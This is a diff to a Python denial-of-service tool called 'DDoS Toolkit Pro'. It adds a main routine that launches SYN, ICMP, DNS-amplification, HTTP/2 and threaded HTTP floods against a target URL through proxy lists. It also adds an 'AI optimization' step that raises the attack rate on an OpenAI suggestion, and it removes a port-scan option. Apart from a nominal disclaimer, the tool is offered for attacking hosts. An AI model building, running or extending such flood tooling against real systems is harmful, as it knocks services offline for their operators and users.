@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 ### BEGIN INIT INFO
 # Provides:          ddos_toolkit
 # Required-Start:    $network $remote_fs
@@ -13,6 +12,7 @@
 # License: MIT License - https://opensource.org/licenses/MIT
 # Disclaimer: Use responsibly in authorized testing scenarios.
 
+# -*- coding: utf-8 -*-
 # Author:
 # - LIONMAD <https://github.com/Midohajhouj>
 
@@ -101,13 +101,15 @@ def display_banner():
 {RESET}
 """)
 
+
+
 def parse_args():
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(description="DDoS Toolkit Pro v1.5 Coded By LIONBAD")
     parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
     parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
-    parser.add_argument("-d", "--duration", type=int, default=1500, help="Attack duration (seconds)")
+    parser.add_argument("-d", "--duration", type=int, default=1500, help="Attaque duration (seconds)")
     parser.add_argument("--proxies", help="File containing proxy list")
     parser.add_argument("--headers", help="Custom headers as JSON string")
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
@@ -121,9 +123,6 @@ def parse_args():
     parser.add_argument("--custom-payload", help="File containing custom payload data")
     parser.add_argument("--dynamic-rate-limit", action="store_true", help="Enable dynamic rate limiting based on target response")
     parser.add_argument("--ai-optimization", action="store_true", help="Enable AI-powered optimization")
-    parser.add_argument("--scan", action="store_true", help="Run a network scan on the target before the attack")
-    parser.add_argument("--port-range", help="Port range for network scan (e.g., 1-1024)")
-    parser.add_argument("--scan-output", help="Output file for network scan results")
     return parser.parse_args()
 
 def load_proxies(proxy_file: str):
@@ -212,20 +211,6 @@ def generate_payload(payload_type: str, custom_payload_file: str = None):
         return payload
     else:
         return None
-
-def run_network_scanner(target_ip, port_range, output_file):
-    """Run the network_scanner.py script."""
-    try:
-        command = ["python3", "network_scanner.py", "-t", target_ip, "-p", port_range]
-        if output_file:
-            command.extend(["-o", output_file])
-        
-        print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
-        subprocess.run(command, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"{RED}[!] Error running network scanner: {e}{RESET}")
-    except FileNotFoundError:
-        print(f"{RED}[!] network_scanner.py not found. Ensure it is in the same directory.{RESET}")
 
 async def resolve_target(target_url: str):
     """Resolve the target URL to an IP address."""
@@ -455,4 +440,90 @@ def get_ai_suggestion():
 
     except Exception as e:
         logging.error(f"Failed to get AI suggestion: {e}")
-        return "
+        return "Unable to fetch AI suggestion. Please check your OpenAI API key and network connection."
+
+def adjust_parameters_based_on_feedback():
+    """Adjust attack parameters based on AI feedback."""
+    suggestion = get_ai_suggestion()
+    print(f"{YELLOW}AI-Powered Suggestion: {suggestion}{RESET}")
+    # Example: Adjust rate limit based on suggestion
+    if "increase rate limit" in suggestion.lower():
+        args.rate_limit += 10
+    elif "decrease rate limit" in suggestion.lower():
+        args.rate_limit -= 10
+    print(f"Adjusted rate limit to {args.rate_limit}")
+
+async def main():
+    """Main function to run the load test."""
+    args = parse_args()
+
+    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
+        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
+        exit(1)
+
+    display_banner()
+
+    proxies = load_proxies(args.proxies) if args.proxies else []
+    if proxies:
+        proxies = validate_proxies(proxies)
+        # Start proxy health monitoring in a separate thread
+        asyncio.create_task(monitor_proxy_health(proxies))
+
+    headers = json.loads(args.headers) if args.headers else None
+
+    target = args.url.split("//")[-1].split("/")[0]
+
+    if not await resolve_target(target):
+        print(f"{RED}Exiting: Target is not reachable.{RESET}")
+        exit(1)
+
+    stop_event = threading.Event()
+    tasks = []
+
+    if args.attack_mode == "syn-flood":
+        target_ip = await resolve_target(target)
+        target_port = 80  # Default port for SYN flood
+        threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration)).start()
+    elif args.attack_mode == "icmp-flood":
+        target_ip = await resolve_target(target)
+        threading.Thread(target=icmp_flood, args=(target_ip, args.duration)).start()
+    elif args.attack_mode == "dns-amplification":
+        target_ip = await resolve_target(target)
+        threading.Thread(target=dns_amplification, args=(target_ip, args.duration)).start()
+    elif args.attack_mode == "http2-flood":
+        for _ in range(args.threads):
+            task = asyncio.create_task(http2_flood(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry, args.custom_payload))
+            tasks.append(task)
+    else:
+        for _ in range(args.threads):
+            task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry, args.custom_payload))
+            tasks.append(task)
+
+        # Display status in a separate thread
+        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
+
+    # Wait for the specified duration, then stop all tasks
+    await asyncio.sleep(args.duration)
+    stop_event.set()
+
+    # Wait for all asyncio tasks to complete
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+    # Display final statistics
+    stats = calculate_rps_stats()
+    print(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")
+
+    if args.results:
+        print(f"{GREEN}Results saved to {args.results}{RESET}")
+
+    # Adjust parameters based on AI feedback
+    if args.ai_optimization:
+        adjust_parameters_based_on_feedback()
+
+if __name__ == "__main__":
+    # Handle signals for graceful exit
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
+    # Run the asyncio event loop
+    asyncio.run(main())
